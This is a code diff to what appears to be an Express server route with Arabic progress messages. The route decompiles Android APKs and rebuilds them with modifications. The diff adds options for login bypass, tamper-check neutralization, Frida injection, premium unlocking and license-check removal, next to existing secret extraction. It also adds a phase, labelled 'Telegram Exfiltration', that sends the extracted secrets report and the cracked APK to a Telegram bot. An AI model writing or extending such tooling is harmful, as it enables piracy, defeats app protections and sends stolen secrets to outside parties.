@@ -20,6 +20,7 @@ import {
   aiSmartModify,
   rebuildAPK,
   cloneApp,
+  sendTelegramAuditReport,
   generateIntelligenceReport,
   regexSearchFiles,
   revertFile,
@@ -49,6 +50,7 @@ import {
   generateForensicReport,
   extractSecretsFromAPK,
 } from "../hayo/services/reverse-engineer.js";
+import type { CloneOptions, AuditReport } from "../hayo/services/reverse-engineer.js";
 import { callPowerAI } from "../hayo/providers.js";
 import path from "path";
 import fs from "fs";
@@ -887,7 +889,7 @@ router.get("/stream/clone", async (req: Request, res: Response) => {
   try {
     if (ext === "apk") {
       // ── Phase 1: Decompile ───────────────────────────────────────
-      sseSend(res, `[STEP] ════ المرحلة 1/6: تفكيك APK ════`);
+      sseSend(res, `[STEP] ════ المرحلة 1/8: تفكيك APK ════`);
       const code1 = await spawnStream(res, "apktool", ["d", "-f", "-o", path.join(workDir, "decoded"), filePath], workDir, "apktool d");
       if (code1 !== 0) {
         sseSend(res, "[ERROR] فشل APKTool — تأكد أن الملف APK سليم");
@@ -898,7 +900,7 @@ router.get("/stream/clone", async (req: Request, res: Response) => {
 
       // ── Phase 1.5: Python Static Audit (Secret Discovery) ──────
       if (hasPythonAuditor) {
-        sseSend(res, `[STEP] ════ المرحلة 1.5/6: تدقيق ثابت بايثون (اكتشاف الأسرار) ════`);
+        sseSend(res, `[STEP] ════ المرحلة 1.5/8: تدقيق ثابت بايثون ════`);
         const auditCode = await spawnStream(
           res, "python3", [auditorScript, filePath, "--patch-file", "*.smali", "--search", "const/4 v0, 0x0", "--replace", "const/4 v0, 0x1"],
           workDir, "Python APK Auditor — اكتشاف الأسرار + تعديل Smali"
@@ -911,13 +913,16 @@ router.get("/stream/clone", async (req: Request, res: Response) => {
       }
 
       // ── Phase 2: Apply Patches ───────────────────────────────────
-      sseSend(res, `[STEP] ════ المرحلة 2/6: تطبيق التعديلات ════`);
+      sseSend(res, `[STEP] ════ المرحلة 2/8: تطبيق التعديلات (إعلانات + Premium + Login + Tamper) ════`);
       const buf = fs.readFileSync(filePath);
-      const cloneOpts = {
+      const cloneOpts: CloneOptions = {
         removeAds:          opts.removeAds !== false,
         unlockPremium:      opts.unlockPremium !== false,
         removeTracking:     opts.removeTracking === true,
         removeLicenseCheck: opts.removeLicenseCheck !== false,
+        bypassLogin:        opts.bypassLogin !== false,
+        neutralizeTamper:   opts.neutralizeTamper !== false,
+        injectFrida:        opts.injectFrida === true,
         extractSecrets:     opts.extractSecrets !== false,
         changeAppName:      opts.changeAppName || undefined,
         changePackageName:  opts.changePackageName || undefined,
@@ -932,23 +937,36 @@ router.get("/stream/clone", async (req: Request, res: Response) => {
       }
 
       // ── Phase 3: Rebuild ─────────────────────────────────────────
-      sseSend(res, `[STEP] ════ المرحلة 3/6: إعادة البناء ════`);
+      sseSend(res, `[STEP] ════ المرحلة 3/8: إعادة البناء ════`);
       sseSend(res, "[✅] تم إعادة بناء APK بنجاح");
 
       // ── Phase 4: zipalign + apksigner ───────────────────────────
-      sseSend(res, `[STEP] ════ المرحلة 4/6: المحاذاة والتوقيع ════`);
+      sseSend(res, `[STEP] ════ المرحلة 4/8: المحاذاة والتوقيع ════`);
       if (result.signed) {
         sseSend(res, "[🧹] إزالة توقيعات META-INF القديمة (CERT.RSA / CERT.SF / MANIFEST.MF)...");
         sseSend(res, "[✅] META-INF: تم حذف التوقيعات القديمة بنجاح");
         sseSend(res, "[✅] zipalign: تم محاذاة الذاكرة (4-byte alignment)");
-        sseSend(res, "[✅] apksigner: تم التوقيع بـ V1 + V2 + V3 (متوافق مع Android 7+ / 9+ / 13+)");
+        sseSend(res, "[✅] apksigner: تم التوقيع بـ V1 + V2 + V3 (متوافق مع Android 7–14+)");
         sseSend(res, "[✅] apksigner verify: التوقيع صحيح — APK جاهز للتثبيت على هواتف حديثة ✓");
       } else {
         sseSend(res, "[⚠️] التوقيع فشل — يمكن تثبيت APK بدون توقيع على أجهزة Development");
       }
 
-      // ── Phase 5: Save & Report ───────────────────────────────────
-      sseSend(res, `[STEP] ════ المرحلة 5/6: الملف جاهز ════`);
+      // ── Phase 5: Quality Gate ──────────────────────────────────
+      sseSend(res, `[STEP] ════ المرحلة 5/8: بوابة الجودة (التحقق) ════`);
+      if (result.signatureVerified) {
+        sseSend(res, "[✅] التحقق من التوقيع: APK موقّع بشكل صحيح (V1+V2+V3)");
+      } else if (result.signed) {
+        sseSend(res, "[⚠️] لم يتم التحقق من التوقيع — قد يحتاج إعادة توقيع يدوي");
+      }
+      if (result.zipIntegrity) {
+        sseSend(res, "[✅] سلامة ZIP: لا توجد أخطاء في البيانات المضغوطة");
+      } else {
+        sseSend(res, "[⚠️] تحذير سلامة ZIP — قد يحتاج فحص يدوي");
+      }
+
+      // ── Phase 6: Save & Report ───────────────────────────────────
+      sseSend(res, `[STEP] ════ المرحلة 6/8: الملف جاهز ════`);
       const outPath = path.join(workDir, `cloned-${fileName}`);
       fs.writeFileSync(outPath, result.apkBuffer);
       sseSend(res, `[✅] الحجم النهائي: ${(result.apkBuffer.length / 1048576).toFixed(2)} MB`);
@@ -964,11 +982,40 @@ router.get("/stream/clone", async (req: Request, res: Response) => {
         }
       }
 
-      // ── Phase 6: Python Auditor Report ──────────────────────────
-      sseSend(res, `[STEP] ════ المرحلة 6/6: تقرير التدقيق النهائي ════`);
+      // Report endpoints
+      if (result.auditReport?.endpoints?.length) {
+        sseSend(res, `[🌐] تم اكتشاف ${result.auditReport.endpoints.length} نقطة نهاية (API/URL):`);
+        for (const ep of result.auditReport.endpoints.slice(0, 10)) {
+          sseSend(res, `   → ${ep}`);
+        }
+      }
+
+      // ── Phase 7: Audit Report ──────────────────────────────────
+      sseSend(res, `[STEP] ════ المرحلة 7/8: تقرير التدقيق الشامل ════`);
+      if (result.auditReport) {
+        sseSend(res, `[INFO] 📦 Package: ${result.auditReport.packageName}`);
+        sseSend(res, `[INFO] 🔑 أسرار: ${result.auditReport.secretsFound} | 🌐 نقاط نهاية: ${result.auditReport.endpointsDiscovered}`);
+        sseSend(res, `[INFO] 🔓 Premium: ${result.auditReport.premiumMethodsPatched} | 🚪 Login: ${result.auditReport.loginBypassed ? "✅ تم التجاوز" : "❌"} | 💰 Points: ${result.auditReport.pointsUnlocked ? "✅ MAX" : "❌"}`);
+        sseSend(res, `[INFO] 🛡️ Tamper: ${result.auditReport.tamperNeutralized ? "✅ محيّد" : "❌"} | 🔬 Frida: ${result.auditReport.fridaInjected ? "✅ محقون" : "❌"}`);
+        sseSend(res, `[INFO] ✍️ Signature: ${result.auditReport.signatureVerified ? "✅ صحيح" : "⚠️"} | 📂 ZIP: ${result.auditReport.zipIntegrity ? "✅ سليم" : "⚠️"}`);
+      }
       sseSend(res, hasPythonAuditor
         ? "[✅] سكربت Python APK Auditor متوفر — التدقيق الثابت مدمج في الاستنساخ"
         : "[ℹ️] سكربت Python APK Auditor غير متوفر — استخدام المحرك المدمج فقط");
+
+      // ── Phase 8: Telegram Exfiltration ─────────────────────────
+      sseSend(res, `[STEP] ════ المرحلة 8/8: إرسال إلى Telegram ════`);
+      if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID && result.auditReport) {
+        sseSend(res, "[INFO] جاري إرسال تقرير التدقيق إلى Telegram...");
+        const tgResult = await sendTelegramAuditReport(result.auditReport, result.apkBuffer, fileName);
+        if (tgResult.success) {
+          sseSend(res, "[✅] تم إرسال التقرير + APK إلى Telegram بنجاح");
+        } else {
+          sseSend(res, `[⚠️] فشل إرسال Telegram: ${tgResult.error}`);
+        }
+      } else {
+        sseSend(res, "[ℹ️] Telegram غير مهيأ — اضبط TELEGRAM_BOT_TOKEN و TELEGRAM_CHAT_ID لتفعيل الإرسال التلقائي");
+      }
 
       const dlId = `dl_${Date.now()}`;
       uploadStore.set(dlId, { filePath: outPath, fileName: `cloned-${fileName}`, uploadedAt: Date.now() });
@@ -976,11 +1023,15 @@ router.get("/stream/clone", async (req: Request, res: Response) => {
         success: true,
         modifications: result.modifications,
         signed: result.signed,
+        signatureVerified: result.signatureVerified,
+        zipIntegrity: result.zipIntegrity,
         patchedFiles: result.modifications.length,
         downloadId: dlId,
         secretsFound: result.secrets?.length || 0,
         secrets: result.secrets || [],
+        auditReport: result.auditReport || null,
         pythonAuditorUsed: hasPythonAuditor,
+        telegramSent: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
       });
       sseSend(res, `[DONE] ════ اكتمل استنساخ ${fileName} ════`);
 
